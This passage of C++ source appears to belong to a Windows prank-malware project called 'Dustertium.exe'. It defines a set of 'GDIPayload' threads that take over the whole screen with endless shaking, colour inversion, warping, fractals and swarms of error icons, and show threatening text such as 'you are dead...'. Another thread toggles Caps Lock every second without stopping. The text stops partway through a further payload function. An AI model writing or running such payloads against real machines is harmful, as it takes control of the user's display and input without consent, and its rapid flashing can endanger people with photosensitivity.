typedef struct IUnknown IUnknown;

#pragma once

#include "Lixo.h"
#include <iostream>

//Define some global variables to use it later
HDC dc = GetDC(NULL);
HDC dcCopy = CreateCompatibleDC(dc);
int w = GetSystemMetrics(0);
int h = GetSystemMetrics(1);

namespace GDIPayloads
{
	DWORD WINAPI GDIPayload1(LPVOID lpvd)
	{
		HBITMAP bmp = CreateCompatibleBitmap(dc, w, h);
		SelectObject(dcCopy, bmp);

		while (1)
		{
			StretchBlt(dcCopy, rand() % 3, rand() % 3, w, h, dc, rand() % 3, rand() % 3, w, h, SRCCOPY);
			StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, w, h, SRCCOPY);

			Sleep(rand() % 25);

			if (rand() % 25 == 24) System::RedrawScreen();
		}

		return 0x00;
	}

	DWORD WINAPI GDIPayload2(LPVOID lpvd)
	{

		HBITMAP bmp = CreateCompatibleBitmap(dc, w, h);
		SelectObject(dcCopy, bmp);

		while (1)
		{
			SetStretchBltMode(dcCopy, COLORONCOLOR);
			SetStretchBltMode(dc, COLORONCOLOR);

			StretchBlt(dcCopy, 0, 0, w / 3, h / 3, dc, 0, 0, w, h, SRCCOPY);
			StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, w / 3, h / 3, SRCCOPY);

			if (rand() % 5 == 4) StretchBlt(dc, 1, 1, w, h, dc, 0, 0, w, h, SRCAND);
		}

		return 0x00;
	}

	DWORD WINAPI GDIPayload3(LPVOID lpvd)
	{
		while (1)
		{
			for (int i = 0; i < 25; i++)
			{
				DrawIcon(dc, rand() % w, rand() % h, LoadIcon(0, IDI_ERROR));
				DrawIcon(dc, rand() % w, rand() % h, LoadIcon(0, IDI_WARNING));
				DrawIcon(dc, rand() % w, rand() % h, LoadIcon(0, IDI_QUESTION));
				Sleep(50);

				if (i == 24) System::RedrawScreen();
			}
		}

		return 0x00;
	}

	DWORD WINAPI GDIPayload4(LPVOID lpvd)
	{
		struct V { float x, y, z; };
		struct Bomb { int x, y, r, alive; };


		int sw = GetSystemMetrics(SM_CXSCREEN);
		int sh = GetSystemMetrics(SM_CYSCREEN);
		HDC h = GetDC(0);

		int px = sw / 2, py = sh / 2;
		int vx = 4, vy = 3;

		float ax = 0, ay = 0, az = 0;

		// Mandelbrot icon Warnings (private GDI Code)
		HICON icoDonut = LoadIcon(NULL, IDI_WARNING);

		// Bombs = ERROR icon
		HICON icoBomb = LoadIcon(NULL, IDI_ERROR);

		srand((unsigned)time(NULL));
		DWORD start = GetTickCount();

		const int MAX_BOMBS = 256;
		Bomb bombs[MAX_BOMBS] = { 0 };

		// Torus resolution (unused now but left intact)
		const int U = 32;
		const int Vv = 32;

		// Torus radii (unused now but left intact)
		float R = 1.6f;   // major radius
		float r = 0.7f;   // minor radius

		while (1) {

			// ============================
			// MANDELBROT GENERATION + DRAW (PRIVATE CODE)
			// ============================

			for (int y = 0; y < sh; y += 8) {
				for (int x = 0; x < sw; x += 8) {
					float cx = (x - sw * 0.5f) / (sw * 0.25f);
					float cy = (y - sh * 0.5f) / (sh * 0.25f);

					float zx = 0.0f, zy = 0.0f;
					int iter = 0, maxIter = 32;

					while (zx * zx + zy * zy < 4.0f && iter < maxIter) {
						float zx2 = zx * zx - zy * zy + cx;
						zy = 2.0f * zx * zy + cy;
						zx = zx2;
						iter++;
					}

					if (iter == maxIter) {
						DrawIconEx(h, x - 8, y - 8, icoDonut, 16, 16, 0, 0, DI_NORMAL);
					}
				}
			}

			DWORD now = GetTickCount();

			// Spawn bombs after 2 seconds
			if (now - start > 2000) {
				if (rand() % 3 == 0) {
					for (int i = 0; i < MAX_BOMBS; i++) {
						if (!bombs[i].alive) {
							bombs[i].alive = 1;
							bombs[i].x = rand() % sw;
							bombs[i].y = rand() % sh;
							bombs[i].r = 10;
							break;
						}
					}
				}
			}

			// Draw bombs as pure ERROR icon rings
			for (int i = 0; i < MAX_BOMBS; i++) {
				if (!bombs[i].alive) continue;

				int x = bombs[i].x;
				int y = bombs[i].y;
				int rr = bombs[i].r;

				for (float a = 0; a < 6.28318f; a += 0.35f) {
					int ix = x + (int)(cosf(a) * rr);
					int iy = y + (int)(sinf(a) * rr);
					DrawIconEx(h, ix - 16, iy - 16, icoBomb, 32, 32, 0, 0, DI_NORMAL);
				}

				DrawIconEx(h, x - 16, y - 16, icoBomb, 32, 32, 0, 0, DI_NORMAL);

				bombs[i].r += 6;
				if (bombs[i].r > max(sw, sh)) bombs[i].alive = 0;
			}

			// Move donut (now unused but left intact)
			px += vx;
			py += vy;

			if (px < 150 || px > sw - 150) vx = -vx;
			if (py < 150 || py > sh - 150) vy = -vy;

			// Rotate donut (unused but left intact)
			ax += 0.015f;
			ay += 0.013f;
			az += 0.011f;

			// Screen shake + invert
			int shake = 12;
			int ox = (rand() % (shake * 2 + 1)) - shake;
			int oy = (rand() % (shake * 2 + 1)) - shake;
			BitBlt(h, ox, oy, sw, sh, h, 0, 0, SRCCOPY);
			PatBlt(h, 0, 0, sw, sh, DSTINVERT);

			Sleep(16);
		}

		ReleaseDC(0, h);
		return 0;
	}



	DWORD WINAPI GDIPayload5(LPVOID lpvd)
	{
		int sw = GetSystemMetrics(SM_CXSCREEN);
		int sh = GetSystemMetrics(SM_CYSCREEN);
		int w = sw;
		int h = sh;

		HDC dc = GetDC(0);              // single screen HDC
		HDC dcCopy = CreateCompatibleDC(dc);

		// Cube / donut center + velocity
		int px = sw / 2, py = sh / 2;
		int vx = 4, vy = 3;

		// Rotation angles (shared for cube + donut)
		float ax = 0, ay = 0, az = 0;

		struct V { float x, y, z; };
		V cube[8] = {
			{-1,-1,-1},{ 1,-1,-1},{ 1, 1,-1},{-1, 1,-1},
			{-1,-1, 1},{ 1,-1, 1},{ 1, 1, 1},{-1, 1, 1}
		};

		int edges[12][2] = {
			{0,1},{1,2},{2,3},{3,0},
			{4,5},{5,6},{6,7},{7,4},
			{0,4},{1,5},{2,6},{3,7}
		};

		POINT p[8];
		HICON ico = LoadIcon(NULL, IDI_ERROR);

		auto project = [&](V v, POINT& o) {
			float cx = cosf(ax), sx = sinf(ax);
			float cy = cosf(ay), sy = sinf(ay);
			float cz = cosf(az), sz = sinf(az);

			float x = v.x, y = v.y, z = v.z;

			// X rotation
			float y1 = y * cx - z * sx;
			float z1 = y * sx + z * cx;

			// Y rotation
			float x2 = x * cy + z1 * sy;
			float z2 = -x * sy + z1 * cy;

			// Z rotation
			float x3 = x2 * cz - y1 * sz;
			float y3 = x2 * sz + y1 * cz;

			// Perspective
			float zz = z2 + 4.0f;
			float scale = 260.0f / zz;

			o.x = px + (int)(x3 * scale);
			o.y = py + (int)(y3 * scale);
			};

		// --- XOR FRACTAL SETUP (CORE UNCHANGED) ---
		int ws = w / 4;
		int hs = h / 4;

		BITMAPINFO bmpi = { 0 };
		HBITMAP bmp;

		bmpi.bmiHeader.biSize = sizeof(bmpi);
		bmpi.bmiHeader.biWidth = ws;
		bmpi.bmiHeader.biHeight = hs;
		bmpi.bmiHeader.biPlanes = 1;
		bmpi.bmiHeader.biBitCount = 32;
		bmpi.bmiHeader.biCompression = BI_RGB;

		RGBQUAD* rgbquad = NULL;

		bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		SelectObject(dcCopy, bmp);

		INT i = 0;
		DOUBLE angle = 0.f;
		bool randomEnabled = true;
		bool random = randomEnabled;

		DWORD start = GetTickCount();

		while (1)
		{
			// ===== XOR FRACTAL FRAME (CORE UNCHANGED) =====
			StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);

			for (int x = 0; x < ws; x++)
			{
				for (int y = 0; y < hs; y++)
				{
					int index = y * ws + x;

					// Center
					int cx = (x - (ws / 2));
					int cy = (y - (hs / 2));

					// Rotation
					int zx = cos(angle) * cx - sin(angle) * cy;
					int zy = sin(angle) * cx + cos(angle) * cy;

					// XOR fractal (UNCHANGED)
					int fx = (zx + i) ^ (zy + i);

					// --- PURE GREEN XOR FRACTAL ---
					rgbquad[index].rgbRed = 0;
					rgbquad[index].rgbBlue = 0;
					rgbquad[index].rgbGreen = (BYTE)fx;   // full 0–255 range
				}
			}

			i++;
			angle += 0.01f;

			StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);

			Sleep(rand() % 10);
			System::RedrawScreen();

			if (rand() % 25 == 0 && random)
			{
				Sleep(1000);
			}

			// ===== PHASE CONTROL: 5s CUBE, 5s DONUT =====
			DWORD elapsed = GetTickCount() - start;
			bool cubePhase = ((elapsed / 5000) % 2) == 0;

			if (cubePhase)
			{
				// --- 3D CUBE WITH ERROR ICONS (UNCHANGED CORE) ---
				for (int ii = 0; ii < 8; ii++)
					project(cube[ii], p[ii]);

				for (int e = 0; e < 12; e++) {
					POINT a = p[edges[e][0]];
					POINT b = p[edges[e][1]];

					int dx = b.x - a.x;
					int dy = b.y - a.y;
					int steps = max(abs(dx), abs(dy)) / 20;
					if (steps < 1) steps = 1;

					float sx = (float)dx / steps;
					float sy = (float)dy / steps;

					float xx = (float)a.x;
					float yy = (float)a.y;

					for (int k = 0; k <= steps; k++) {
						DrawIconEx(dc, (int)xx - 8, (int)yy - 8, ico, 16, 16, 0, 0, DI_NORMAL);
						xx += sx;
						yy += sy;
					}
				}

				px += vx;
				py += vy;

				if (px < 150 || px > sw - 150) vx = -vx;
				if (py < 150 || py > sh - 150) vy = -vy;

				ax += 0.015f;
				ay += 0.013f;
				az += 0.011f;
			}
			else
			{
				// --- 3D DONUT MADE OF ERROR ICONS, MOVING + SPINNING XYZ ---
				float cxr = cosf(ax), sxr = sinf(ax);
				float cyr = cosf(ay), syr = sinf(ay);
				float czr = cosf(az), szr = sinf(az);

				float R = 1.5f;   // major radius
				float r = 0.6f;   // minor radius

				for (float u = 0; u < 6.28318f; u += 0.18f)
				{
					float cu = cosf(u), su = sinf(u);

					for (float v = 0; v < 6.28318f; v += 0.18f)
					{
						float cv = cosf(v), sv = sinf(v);

						float x = (R + r * cv) * cu;
						float y = (R + r * cv) * su;
						float z = r * sv;

						// Rotate around X
						float y1 = y * cxr - z * sxr;
						float z1 = y * sxr + z * cxr;

						// Rotate around Y
						float x2 = x * cyr + z1 * syr;
						float z2 = -x * syr + z1 * cyr;

						// Rotate around Z
						float x3 = x2 * czr - y1 * szr;
						float y3 = x2 * szr + y1 * czr;

						// Perspective
						float zz = z2 + 5.0f;
						float scale = 260.0f / zz;

						int sx = px + (int)(x3 * scale);
						int sy = py + (int)(y3 * scale);

						DrawIconEx(dc, sx - 8, sy - 8, ico, 16, 16, 0, 0, DI_NORMAL);
					}
				}

				// Move donut center like cube
				px += vx;
				py += vy;

				if (px < 150 || px > sw - 150) vx = -vx;
				if (py < 150 || py > sh - 150) vy = -vy;

				// Spin in X, Y, Z
				ax += 0.02f;
				ay += 0.018f;
				az += 0.016f;
			}
		}

		return 0x00;
	}

	DWORD WINAPI GDIPayload6(LPVOID lpvd)
	{
		BITMAPINFO bmpi = { 0 };
		HBITMAP bmp;

		bmpi.bmiHeader.biSize = sizeof(bmpi);
		bmpi.bmiHeader.biWidth = w;
		bmpi.bmiHeader.biHeight = h;
		bmpi.bmiHeader.biPlanes = 1;
		bmpi.bmiHeader.biBitCount = 32;
		bmpi.bmiHeader.biCompression = BI_RGB;

		RGBQUAD* rgbquad = NULL;
		HSL hslcolor;

		bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		SelectObject(dcCopy, bmp);

		INT i = 0;

		while (1)
		{
			StretchBlt(dcCopy, 0, 0, w, h, dc, 0, 0, w, h, SRCCOPY);

			for (int y = 0; y < h; y++)
			{
				for (int x = 0; x < w; x++)
				{
					int index = y * w + x;

					FLOAT fx = ((x + i) ^ (y + i)) + 100 * sinf((x + y + i) * 0.01f);

					RGBQUAD rgbquadCopy = rgbquad[index];
					hslcolor = Colors::rgb2hsl(rgbquadCopy);
					hslcolor.h = fmodf(fx / 300.f + y / (float)h * 0.1f, 1.f);
					rgbquad[index] = Colors::hsl2rgb(hslcolor);
				}
			}

			i++;
			StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, w, h, SRCCOPY);
		}
	}

	DWORD WINAPI GDIPayload7(LPVOID lpvd)
	{
		HDC dc = GetDC(0); LOGFONTW lf = { 0 }; lf.lfWidth = 20; lf.lfHeight = 50; lf.lfOrientation = 400; lf.lfWeight = 800; lf.lfUnderline = TRUE; lf.lfQuality = DRAFT_QUALITY; lf.lfPitchAndFamily = DEFAULT_PITCH | FF_ROMAN; lstrcpyW(lf.lfFaceName, L"Times New Roman"); RECT r; POINT p[3]; LPCSTR s[] = { "Dustertium.exe", "its too late...", "you are dead...", "terais feels my pain..." }; HICON q = LoadIcon(NULL, IDI_WARNING); while (1) { int rnd = rand() % 65 + 60; for (int i = 0; i < rnd; i += 20) { GetWindowRect(GetDesktopWindow(), &r); p[0].x = r.left + i; p[0].y = r.top - i; p[1].x = r.right + i; p[1].y = r.top + i; p[2].x = r.left - i; p[2].y = r.bottom - i; PlgBlt(dc, p, dc, 0, 0, r.right - r.left, r.bottom - r.top, 0, 0, 0); PatBlt(dc, 0, 0, r.right - r.left, r.bottom - r.top, PATINVERT); lf.lfEscapement = rand() % 3600; HFONT f = CreateFontIndirectW(&lf); SelectObject(dc, f); int w = r.right - r.left; int h = r.bottom - r.top; SetTextColor(dc, RGB(rand() % 255, rand() % 255, rand() % 255)); SetBkColor(dc, RGB(rand() % 160, rand() % 160, rand() % 160)); int idx = rand() % 4; TextOutA(dc, rand() % w, rand() % h, s[idx], lstrlenA(s[idx])); for (int k = 0; k < 6; k++) DrawIcon(dc, rand() % w, rand() % h, q); Sleep(40); } for (int i = 0; i < rnd; i += 20) { GetWindowRect(GetDesktopWindow(), &r); p[0].x = r.left - i; p[0].y = r.top + i; p[1].x = r.right - i; p[1].y = r.top - i; p[2].x = r.left + i; p[2].y = r.bottom + i; PlgBlt(dc, p, dc, 0, 0, r.right - r.left, r.bottom - r.top, 0, 0, 0); PatBlt(dc, 0, 0, r.right - r.left, r.bottom - r.top, PATINVERT); lf.lfEscapement = rand() % 3600; HFONT f = CreateFontIndirectW(&lf); SelectObject(dc, f); int w = r.right - r.left; int h = r.bottom - r.top; SetTextColor(dc, RGB(rand() % 255, rand() % 255, rand() % 255)); SetBkColor(dc, RGB(rand() % 160, rand() % 160, rand() % 160)); int idx = rand() % 4; TextOutA(dc, rand() % w, rand() % h, s[idx], lstrlenA(s[idx])); for (int k = 0; k < 6; k++) DrawIcon(dc, rand() % w, rand() % h, q); Sleep(1); } } return 0;
	}



	DWORD WINAPI GDIPayload8(LPVOID lpvd)
	{
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		bool running = true;
		HDC dc = GetDC(NULL);            // valid DC, no hwnd needed
		HDC dcCopy = CreateCompatibleDC(dc);

		BITMAPINFO bmi = { 0 };
		bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
		bmi.bmiHeader.biWidth = w;
		bmi.bmiHeader.biHeight = -h;
		bmi.bmiHeader.biPlanes = 1;
		bmi.bmiHeader.biBitCount = 32;
		bmi.bmiHeader.biCompression = BI_RGB;

		RGBQUAD* rgbquad = nullptr;

		HBITMAP bmp = CreateDIBSection(dc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		HBITMAP old = (HBITMAP)SelectObject(dcCopy, bmp);

		static int t = 0;

		while (running)
		{
			for (int y = 0; y < h; y++)
			{
				for (int x = 0; x < w; x++)
				{
					int sx = (x + t) & 1023;
					int sy = (y + t) & 1023;

					int v = ((sx & sy) == 0) ? 255 : 0;

					BYTE R = v ^ 255;
					BYTE G = v ^ 128;
					BYTE B = v ^ 64;

					rgbquad[y * w + x] = { B, G, R, 0 };
				}
			}

			BitBlt(dc, 0, 0, w, h, dcCopy, 0, 0, SRCCOPY);

			t++;

			Sleep(16);
		}

		SelectObject(dcCopy, old);
		DeleteObject(bmp);
		DeleteDC(dcCopy);
		ReleaseDC(NULL, dc);
		return 0;
	}


	DWORD WINAPI GDIPayload9(LPVOID lpvd)
	{
		BITMAPINFO bmpi = { 0 };
		HBITMAP bmp;

		bmpi.bmiHeader.biSize = sizeof(bmpi.bmiHeader);
		bmpi.bmiHeader.biWidth = w;
		bmpi.bmiHeader.biHeight = -h;   // top‑down for easier indexing
		bmpi.bmiHeader.biPlanes = 1;
		bmpi.bmiHeader.biBitCount = 32;
		bmpi.bmiHeader.biCompression = BI_RGB;

		RGBQUAD* rgbquad = NULL;

		bmp = CreateDIBSection(dcCopy, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		SelectObject(dcCopy, bmp);

		while (1)
		{
			// random brush for PATINVERT
			HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
			SelectObject(dcCopy, hBrush);

			// copy window → DIBSection with PATINVERT
			StretchBlt(dcCopy, 0, 0, w, h, dc, 0, 0, w, h, SRCCOPY | PATINVERT);

			// pixel‑level color invert + sinewave shake
			static float t = 0.0f;
			t += 0.1f;

			for (int y = 0; y < h; y++)
			{
				int shift = (int)(sin((y + t * 20) * 0.03f) * 10); // safe shake

				for (int x = 0; x < w; x++)
				{
					int sx = x + shift;
					if (sx < 0 || sx >= w) continue;

					RGBQUAD px = rgbquad[y * w + sx];

					// invert color
					px.rgbRed = 255 - px.rgbRed;
					px.rgbGreen = 255 - px.rgbGreen;
					px.rgbBlue = 255 - px.rgbBlue;

					rgbquad[y * w + x] = px;
				}
			}

			// draw random circle on top
			int cx = rand() % w;
			int cy = rand() % h;
			int r = 40;

			Ellipse(dcCopy, cx - r, cy - r, cx + r, cy + r);

			// blit final result to your window
			BitBlt(dc, 0, 0, w, h, dcCopy, 0, 0, SRCCOPY);

			DeleteObject(hBrush);
			Sleep(10);
		}

	}

	DWORD WINAPI GDIPayload10(LPVOID lpvd)
	{
		int w = GetSystemMetrics(SM_CXSCREEN);
		int h = GetSystemMetrics(SM_CYSCREEN);

		HDC scr = GetDC(0);
		HDC dc = GetDC(0);
		HICON hi = LoadIcon(0, IDI_ERROR);

		// persistent state for loop
		static float ax = 0, ay = 0, az = 0;
		static float px = w / 2, py = h / 2;
		static float vx = 4, vy = 3;

		while (1) // <<< YOUR LOOP
		{
			// --- tunnel invert warp (unchanged) ---
			for (int y0 = 0; y0 < h; y0++)
			{
				int off = (int)(sin((y0 + ax * 4) * 0.03) * 40);
				BitBlt(dc, off, y0, w, 1, dc, 0, y0, SRCINVERT);
			}

			// ============================================================
			// 🔥 REPLACEMENT FOR THE 3D DONUT — SCREEN SHAKE + INVERT + ICONS
			// ============================================================

			// --- screen shake ---
			int shakeX = (rand() % 15) - 7;
			int shakeY = (rand() % 15) - 7;
			BitBlt(dc, shakeX, shakeY, w, h, dc, 0, 0, SRCCOPY);

			// --- random color inversion bursts ---
			if (rand() % 3 == 0)
			{
				int rx = rand() % w;
				int ry = rand() % h;
				int rw = 80 + rand() % 200;
				int rh = 80 + rand() % 200;
				BitBlt(dc, rx, ry, rw, rh, dc, rx, ry, SRCINVERT);
			}

			// --- spawn many error icons randomly ---
			for (int i = 0; i < 40; i++)
			{
				int ix = rand() % w;
				int iy = rand() % h;
				DrawIconEx(dc, ix, iy, hi, 16, 16, 0, 0, DI_NORMAL);
			}

			// --- drift rotation values (kept from your original loop) ---
			ax += 0.03f;
			ay += 0.02f;
			az += 0.04f;

			// --- bounce center point (kept from your original loop) ---
			px += vx;
			py += vy;
			if (px < 0 || px > w) vx = -vx;
			if (py < 0 || py > h) vy = -vy;

			Sleep(10);
		}
	}

	DWORD WINAPI GDIPayload11(LPVOID lpvd)
	{
		HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
		INT w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
		BITMAPINFO bmi = { 0 };
		RGBQUAD* rgbScreen = 0;
		bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
		bmi.bmiHeader.biWidth = w;
		bmi.bmiHeader.biHeight = -h;
		bmi.bmiHeader.biPlanes = 1;
		bmi.bmiHeader.biBitCount = 32;
		bmi.bmiHeader.biCompression = BI_RGB;
		bool random = true;
		HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, (void**)&rgbScreen, 0, 0);
		SelectObject(hdcMem, hbmTemp);
		RECT rekt;
		POINT rotate[3];

		while (1) {
			BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
			for (INT i = 0; i < w * h; i++) {
				INT x = i % w, y = i / w;
				rgbScreen[i].rgbRed += x;
				rgbScreen[i].rgbGreen += y;
				rgbScreen[i].rgbBlue += (x ^ y);
			}
			BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);

			int rnd = rand() % 65 + 60;
			for (int i = 0; i < rnd; i += 20) {
				GetWindowRect(GetDesktopWindow(), &rekt);
				rotate[0].x = rekt.left + i;
				rotate[0].y = rekt.top - i;
				rotate[1].x = rekt.right + i;
				rotate[1].y = rekt.top + i;
				rotate[2].x = rekt.left - i;
				rotate[2].y = rekt.bottom - i;
				PlgBlt(hdcScreen, rotate, hdcMem, 0, 0, w, h, 0, 0, 0);
				Sleep(40);
			}
			for (int i = 0; i < rnd; i += 20) {
				GetWindowRect(GetDesktopWindow(), &rekt);
				rotate[0].x = rekt.left - i;
				rotate[0].y = rekt.top + i;
				rotate[1].x = rekt.right - i;
				rotate[1].y = rekt.top - i;
				rotate[2].x = rekt.left + i;
				rotate[2].y = rekt.bottom + i;
				PlgBlt(hdcScreen, rotate, hdcMem, 0, 0, w, h, 0, 0, 0);
				Sleep(40);
			}
		}
	}

	DWORD WINAPI GDIPayload12(LPVOID lpvd)
	{
		int w = GetSystemMetrics(SM_CXSCREEN);
		int h = GetSystemMetrics(SM_CYSCREEN);

		HDC dc = GetDC(NULL);
		HDC dcCopy = CreateCompatibleDC(dc);

		int ws = w / 4;
		int hs = h / 4;

		BITMAPINFO bmpi = { 0 };
		bmpi.bmiHeader.biSize = sizeof(bmpi);
		bmpi.bmiHeader.biWidth = ws;
		bmpi.bmiHeader.biHeight = hs;
		bmpi.bmiHeader.biPlanes = 1;
		bmpi.bmiHeader.biBitCount = 32;
		bmpi.bmiHeader.biCompression = BI_RGB;

		RGBQUAD* rgbquad = NULL;
		HBITMAP bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		SelectObject(dcCopy, bmp);

		INT i = 0;
		DOUBLE angle = 0.f;

		// real ERROR icon
		HICON hi = LoadIcon(0, IDI_ERROR);

		static float ax = 0, ay = 0, az = 0;
		static float px = w / 2, py = h / 2;
		static float vx = 4, vy = 3;

		// --- 3D ERROR ICON CUBE SETUP (unchanged later) ---
		struct V { float x, y, z; };

		V cube[8] = {
			{-1,-1,-1},{ 1,-1,-1},{ 1, 1,-1},{-1, 1,-1},
			{-1,-1, 1},{ 1,-1, 1},{ 1, 1, 1},{-1, 1, 1}
		};

		int edges[12][2] = {
			{0,1},{1,2},{2,3},{3,0},
			{4,5},{5,6},{6,7},{7,4},
			{0,4},{1,5},{2,6},{3,7}
		};

		POINT p[8];

		auto project = [&](V v, POINT& o) {
			float cx = cosf(ax), sx = sinf(ax);
			float cy = cosf(ay), sy = sinf(ay);
			float cz = cosf(az), sz = sinf(az);

			float x = v.x, y = v.y, z = v.z;

			float y1 = y * cx - z * sx;
			float z1 = y * sx + z * cx;

			float x2 = x * cy + z1 * sy;
			float z2 = -x * sy + z1 * cy;

			float x3 = x2 * cz - y1 * sz;
			float y3 = x2 * sz + y1 * cz;

			float zz = z2 + 4.0f;
			float scale = 260.0f / zz;

			o.x = (int)(px + x3 * scale);
			o.y = (int)(py + y3 * scale);
			};

		while (1)
		{
			// --- SCREEN SHAKE + INVERT ---
			int shakeX = (rand() % 15) - 7;
			int shakeY = (rand() % 15) - 7;
			BitBlt(dc, shakeX, shakeY, w, h, dc, 0, 0, SRCINVERT);

			// --- RANDOM ERROR ICONS ---
			for (int k = 0; k < 40; k++)
				DrawIconEx(dc, rand() % w, rand() % h, hi, 16, 16, 0, 0, DI_NORMAL);

			// --- 3D ERROR ICON CUBE ---
			for (int j = 0; j < 8; j++)
				project(cube[j], p[j]);

			for (int e = 0; e < 12; e++) {
				POINT a = p[edges[e][0]];
				POINT b = p[edges[e][1]];

				int dx = b.x - a.x;
				int dy = b.y - a.y;
				int steps = max(abs(dx), abs(dy)) / 20;
				if (steps < 1) steps = 1;

				float sx = (float)dx / steps;
				float sy = (float)dy / steps;

				float xx = (float)a.x;
				float yy = (float)a.y;

				for (int s = 0; s <= steps; s++) {
					DrawIconEx(dc, (int)xx - 8, (int)yy - 8, hi, 16, 16, 0, 0, DI_NORMAL);
					xx += sx;
					yy += sy;
				}
			}

			ax += 0.04f;
			ay += 0.03f;
			az += 0.05f;

			px += vx;
			py += vy;

			if (px < 100 || px > w - 100) vx = -vx;
			if (py < 100 || py > h - 100) vy = -vy;

			// --- XOR FRACTAL (UNTOUCHED) ---
			StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);

			for (int x = 0; x < ws; x++)
			{
				for (int y = 0; y < hs; y++)
				{
					int index = y * ws + x;

					int cx = (x - (ws / 2));
					int cy = (y - (hs / 2));

					int zx = (int)(cos(angle) * cx - sin(angle) * cy);
					int zy = (int)(sin(angle) * cx + cos(angle) * cy);

					int fx = (zx + i) ^ (zy + i);

					rgbquad[index].rgbRed += fx;
					rgbquad[index].rgbGreen += fx;
					rgbquad[index].rgbBlue += fx;
				}
			}

			i++;
			angle += 0.01f;

			StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);

			Sleep(rand() % 10);
			System::RedrawScreen();

			if (rand() % 25 == 0)
				Sleep(1000);
		}

		return 0;
	}


	DWORD WINAPI GDIPayload13(LPVOID lpvd)
	{
		int w = GetSystemMetrics(SM_CXSCREEN);
		int h = GetSystemMetrics(SM_CYSCREEN);
		int shakeIntensity = 5;
		HDC dc = GetDC(NULL);
		HDC dcCopy = CreateCompatibleDC(dc);

		int ws = w / 4;
		int hs = h / 4;

		BITMAPINFO bi = { 0 };
		bi.bmiHeader.biSize = sizeof(bi);
		bi.bmiHeader.biWidth = ws;
		bi.bmiHeader.biHeight = hs;
		bi.bmiHeader.biPlanes = 1;
		bi.bmiHeader.biBitCount = 32;
		bi.bmiHeader.biCompression = BI_RGB;

		RGBQUAD* px = 0;
		HBITMAP bmp = CreateDIBSection(dc, &bi, DIB_RGB_COLORS, (void**)&px, 0, 0);
		SelectObject(dcCopy, bmp);

		int i = 0;
		float ax = 0, ay = 0, az = 0;
		float px0 = w / 2, py0 = h / 2;
		float vx = 4, vy = 3;

		while (1)
		{
			StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);

			for (int x = 0; x < ws; x++)
				for (int y = 0; y < hs; y++)
				{
					int idx = y * ws + x;
					int cx = x - ws / 2;
					int cy = y - hs / 2;

					int zx = cos(ax) * cx - sin(ax) * cy;
					int zy = sin(ax) * cx + cos(ax) * cy;

					int fx = (zx + i) ^ (zy + i);

					px[idx].rgbRed += fx;
					px[idx].rgbGreen += fx;
					px[idx].rgbBlue += fx;
				}

			StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);

			for (int y0 = 0; y0 < h; y0++)
			{
				int off = (int)(sin((y0 + ax * 4) * 0.03) * 40);
				BitBlt(dc, off, y0, w, 1, dc, 0, y0, SRCINVERT);
			}

			for (int yy = -120; yy < 120; yy++)
				for (int xx = -120; xx < 120; xx++)
				{
					float rx = xx * cos(ax) - yy * sin(ax);
					float ry = xx * sin(ax) + yy * cos(ax);

					int sx = (int)(px0 + rx);
					int sy = (int)(py0 + ry);

					if (sx >= 0 && sx < w && sy >= 0 && sy < h)
					{
						int c = ((int)rx ^ (int)ry) & 255;
						SetPixel(dc, sx, sy, RGB(c, 255 - c, c ^ 128));
					}
				}

			for (int s = 0; s < shakeIntensity; s++)
			{
				StretchBlt(dcCopy, rand() % 3, rand() % 3, w, h, dc, rand() % 3, rand() % 3, w, h, SRCCOPY);
				StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, w, h, SRCCOPY);
			}

			ax += 0.04f;
			ay += 0.03f;
			az += 0.05f;

			px0 += vx;
			py0 += vy;

			if (px0 < 100 || px0 > w - 100) vx = -vx;
			if (py0 < 100 || py0 > h - 100) vy = -vy;

			i++;
			Sleep(1);
			System::RedrawScreen();
		}
	}

	DWORD WINAPI CAPSLOCK(LPVOID lpvd)
	{
		for (;;) {
			keybd_event(VK_CAPITAL, 0x45, 0, 0); keybd_event(VK_CAPITAL, 0x45, KEYEVENTF_KEYUP, 0); Sleep(1000);
		}
	}

	DWORD WINAPI WINDOWSSTART(LPVOID lpvd)
	{
			int sw = GetSystemMetrics(SM_CXSCREEN);
			int sh = GetSystemMetrics(SM_CYSCREEN);

			HDC screen = GetDC(NULL);

			// Effect 1: sine-scroll BitBlt
			double sinePhase = 0.0;

			// Effect 2: HSV wave distortion
			int ws = sw / 4;
			int hs = sh / 4;

			BITMAPINFO bmpi = { 0 };
			bmpi.bmiHeader.biSize = sizeof(bmpi);
			bmpi.bmiHeader.biWidth = ws;
			bmpi.bmiHeader.biHeight = hs;
			bmpi.bmiHeader.biPlanes = 1;
			bmpi.bmiHeader.biBitCount = 32;
			bmpi.bmiHeader.biCompression = BI_RGB;

			DWORD* rgb = NULL;
